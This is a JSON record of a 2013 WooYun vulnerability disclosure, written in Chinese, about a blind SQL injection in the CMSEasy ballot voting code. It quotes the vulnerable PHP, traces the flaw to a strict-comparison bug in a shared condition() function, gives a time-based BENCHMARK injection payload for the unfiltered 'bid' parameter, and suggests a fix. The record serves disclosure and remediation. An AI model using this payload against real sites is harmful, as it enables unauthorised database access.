{"id": 6586, "wybug_id": "wooyun-2013-040506", "wybug_title": "cmseasy盲注漏洞", "wybug_corp": "cmseasy", "wybug_author": "Chora", "wybug_date": "2013-10-21 13:13", "wybug_open_date": "2014-01-19 13:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-12-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-19：\t细节向公众公开  简要描述： cmseasy盲注漏洞 详细说明：  出错的是一个通用函数，所以注入不只一处，在这里就用能够相对简单利用的来写。lib/default/ballot_act.php\nfunction index_action() {        if (front::post('submit')) {            if (!front::post('ballot')) {                front::alert(lang('Please_select_vote'));                return false;            }\t\t\t/*            if (config::get('checkip')) {                $time=cookie::get('vttime');                if (time() -$time <config::get('timer') * 60) {                    front::alert(lang('You_have_voted'));                    return false;                }\t\t\t\t            }*/            $bid=front::$post['bid'];            if (is_array(front::$post['ballot'])) {                $ids=implode(',',front::$post['ballot']);            }            else {                $ids=front::$post['ballot'];            }            if(preg_match('/(select|union|and|\\'|\"|\\))/i',$ids)){ //只是检查了$ids并没有检查$bid。读代码眼睛读花了还真看不错来- -。            \texit('非法参数');            }            $where=\"id in($ids)\";            $data='num=num+1';            $option=new option();            $option->rec_update($data,$where);            $this->_table->rec_update($data,$bid); //跟进 0x01//1 and if(1=1,BENCHMARK(1000000,MD5(1)),null)//UPDATE `cmseasy_ballot` SET num=num+1 WHERE and if(1=1,BENCHMARK(1000000,MD5(1)),null) 延时3秒左右。//UPDATE `cmseasy_ballot` SET num=num+1 WHERE and if(1=2,BENCHMARK(1000000,MD5(1)),null)            cookie::set('vttime',time(),time() +3600 * 24);            front::alert(lang('Successful_vote'));        }    }\nlib/inc/table.php 0x01\nfunction rec_update($row,$where) {        $tbname=$this->name;        $sql=$this->sql_update($tbname,$row,$where); //跟进        //echo $sql.\"<br>\";        return $this->query_unbuffered($sql) or die(mysql_error());    }function sql_update($tbname,$row,$where) {        $sqlud='';        if (is_string($row))             $sqlud=$row.' ';        else            foreach ($row as $key=>$value) {                if (in_array($key,explode(',',$this->getcolslist()))) {                    $value=$value;                    if (preg_match('/^\\[(.*)\\]$/',$value,$match))                        $sqlud .= \"`$key`\".\"= \".$match[1].\",\";                    elseif ($value === \"\")                        $sqlud .= \"`$key`= NULL, \";                    else                        $sqlud .= \"`$key`\".\"= '\".$value.\"',\";                }            }        $sqlud=rtrim($sqlud);        $sqlud=rtrim($sqlud,',');        $this->condition($where);//问题处在这儿，跟进        $sql=\"UPDATE `\".$tbname.\"` SET \".$sqlud.\" WHERE \".$where;        return $sql;    }function condition(&$condition) {        if (isset($condition) &&is_array($condition)) { //不是数组跳过            $_condition=array();            foreach ($condition as $key=>$value) {                $value=str_replace(\"'\",\"\\'\",$value);                $_condition[]=\"`$key`='$value'\";            }            $condition=implode(' and ',$_condition);        }        else if (is_numeric($condition)) { //不是数字跳过            $this->getFields();            $condition=\"`$this->primary_key`='$condition'\";        }else if(true === $condition){ //错在这儿,程序员本意是如果值为真就把'true'赋值给$condition,这样不是数组又不是数字的就过滤了,但是他用了3个等号，全等，类型也要匹配才会赋值，所以这里跳过了赋值，所以悲剧发生了，只要用到condition这个函数的都会悲剧。//很多关键的数据库操作都调用了该函数，慢慢找还会有很多注入的。建议改成2个等号修复该函数而不是过滤这个投票的参数。        \t$condition = 'true';        }        if (get_class($this) == 'archive') {            if (!front::get('deletestate')) {                if ($condition)                    $condition.=' and (state IS NULL or state<>\\'-1\\') ';                else                    $condition='state IS NULL or state<>\\'-1\\' ';            }            else {                if ($condition)                    $condition.=' and state=\\'-1\\' ';                else                    $condition=' state=\\'-1\\' ';            }        }    }\n   漏洞证明：  \n\n\n\n   修复方案：  继续求包养。   版权声明：转载请注明来源 Chora@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-10-21 13:15 厂商回复： 感谢，尽快修正 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}